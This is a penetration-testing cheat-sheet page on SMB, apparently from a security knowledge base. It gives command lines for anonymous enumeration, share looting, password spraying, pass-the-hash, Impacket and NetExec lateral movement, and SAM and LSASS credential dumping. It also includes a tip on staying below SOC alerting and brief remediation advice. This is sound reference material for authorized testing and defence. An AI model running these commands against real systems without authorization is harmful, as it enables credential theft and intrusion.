---
tags:
  - Network
  - Windows
---

# :material-folder-network: SMB

<span class="pill pill-medium">network</span> <span class="pill pill-info">windows</span>

**SMB** (ports 139/445) is the Windows file-sharing and RPC protocol. It leaks a huge amount of enumeration data and is a primary lateral-movement channel.

!!! abstract "TL;DR"
    Enumerate shares/users anonymously, spray credentials with NetExec, read/write shares, and once you have admin creds move laterally with `psexec`/`wmiexec`/`smbexec` or dump SAM.

## :material-magnify: Anonymous / null-session enumeration

```bash
# Host + signing + null-session in one shot
nxc smb 10.10.10.5 -u '' -p ''
nxc smb 10.10.10.5 -u 'guest' -p ''

# Shares
smbclient -L //10.10.10.5 -N
nxc smb 10.10.10.5 -u '' -p '' --shares

# Users via RID cycling (works surprisingly often)
nxc smb 10.10.10.5 -u '' -p '' --rid-brute 10000
lookupsid.py anonymous@10.10.10.5

# Full RPC enumeration
enum4linux-ng -A 10.10.10.5
```

!!! loot "RID cycling → a user list"
    Even a null session frequently yields the full domain user list via SID enumeration. That list feeds password spraying and [Kerberos](kerberos.md) roasting.

## :material-folder-open: Reading & writing shares

```bash
smbclient //10.10.10.5/Share -N
smbclient //10.10.10.5/Share -U 'corp/bob%Passw0rd'
#  smb> get file.txt     smb> put shell.exe     smb> recurse ON; mget *

# Mount it
mount -t cifs //10.10.10.5/Share /mnt/s -o username=bob,password=Passw0rd

# Spider every readable share for secrets
nxc smb 10.10.10.5 -u bob -p Passw0rd -M spider_plus
manspider 10.10.10.5 -u bob -p Passw0rd -f passw config .kdbx
```

!!! loot "What to hunt on shares"
    `web.config`, `unattend.xml`, `sysprep.inf`, `.kdbx` (KeePass), PowerShell scripts with creds, `Groups.xml` (GPP), backups, and the ever-present `passwords.xlsx`.

## :material-spray: Credential validation & spraying

```bash
# Validate a credential across many hosts (see who you're local admin on)
nxc smb 10.10.10.0/24 -u bob -p Passw0rd
#  (Pwn3d!) means local admin -> lateral movement target

# Password spray one password across many users (avoid lockout!)
nxc smb DC01 -u users.txt -p 'Spring2026!' --continue-on-success

# Pass-the-Hash
nxc smb 10.10.10.5 -u administrator -H <NTLM_HASH>
```

!!! opsec "Spraying causes lockouts and alerts"
    Respect the domain lockout policy (`nxc smb DC -u u -p p --pass-pol`). Spray **one** password per round, wait out the observation window, and you'll avoid locking out accounts (and lighting up the SOC).

## :material-arrow-right-bold: Lateral movement (with admin creds)

=== "Impacket"

    ```bash
    psexec.py corp/admin:'Pass'@10.10.10.5      # SYSTEM, noisy, drops a service
    wmiexec.py corp/admin:'Pass'@10.10.10.5     # semi-interactive, quieter
    smbexec.py corp/admin:'Pass'@10.10.10.5     # no binary drop
    atexec.py  corp/admin:'Pass'@10.10.10.5 whoami   # scheduled-task exec
    ```

=== "NetExec"

    ```bash
    nxc smb 10.10.10.5 -u admin -p Pass -x 'whoami'          # run a command
    nxc smb 10.10.10.5 -u admin -H <hash> --sam              # dump local SAM
    nxc smb 10.10.10.5 -u admin -p Pass -M lsassy            # dump LSASS creds
    ```

!!! loot "Dumping SAM/LSASS"
    `--sam` gives local account hashes (pass-the-hash fodder). `lsassy`/`nanodump` pulls cached domain creds from LSASS — often a domain admin who logged in.

## :material-alert: Notable SMB CVEs

- **MS17-010 (EternalBlue)** — unauth RCE on unpatched SMBv1. `nmap --script smb-vuln-ms17-010`.
- **SMBGhost (CVE-2020-0796)** — SMBv3 compression overflow.
- **PrintNightmare / PetitPotam** — coerce auth (feeds relay attacks).

## :material-shield-check: Remediation

- Disable SMBv1; require SMB signing (blocks relay).
- Kill null sessions; restrict anonymous enumeration.
- LAPS for unique local admin passwords (kills pass-the-hash reuse).

## :material-link-variant: Related

- Feeds [Kerberos](kerberos.md) roasting and [Active Directory](active-directory.md) attack paths.
- Coerced auth → NTLM relay, see [Active Directory](active-directory.md).
- Dumped hashes → [Windows Privesc](../privesc/windows.md) and pass-the-hash.
- Reference: [NetExec wiki](https://www.netexec.wiki/).
